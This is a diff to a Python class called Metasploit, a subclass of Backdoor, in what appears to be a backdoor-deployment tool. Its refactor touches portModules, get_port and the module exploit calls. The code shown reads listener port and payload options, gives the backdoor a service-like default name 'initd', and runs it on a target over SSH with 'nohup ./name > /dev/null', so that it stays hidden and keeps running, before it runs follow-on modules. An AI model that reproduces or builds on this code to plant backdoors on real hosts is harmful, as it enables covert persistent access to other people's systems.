@@ -17,16 +17,11 @@ class Metasploit(Backdoor):
                 "name"    : Option("name", "initd", "name of the backdoor", False)
                 }
         self.modules = {} 
-        self.portModules = {}
-	self.allow_modules = True
+        self.allow_modules = True
 
     def get_command(self):
         return "nohup ./%s > /dev/null" % self.get_value("name")
    
-    def get_port(self):
-        return self.get_value("lport")
-
- 
     def do_exploit(self, args):
         port = self.get_value("lport")
         payload = self.get_value("payload")
@@ -47,8 +42,5 @@ class Metasploit(Backdoor):
         target.ssh.exec_command(self.get_command())
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
-            mod.exploit(self.get_command())
-	for mod in self.portModules.keys():
-            print(INFO + "Attempting to execute " + mod.name + " module...")
-            mod.exploit(self.get_port())
+            mod.exploit()
 
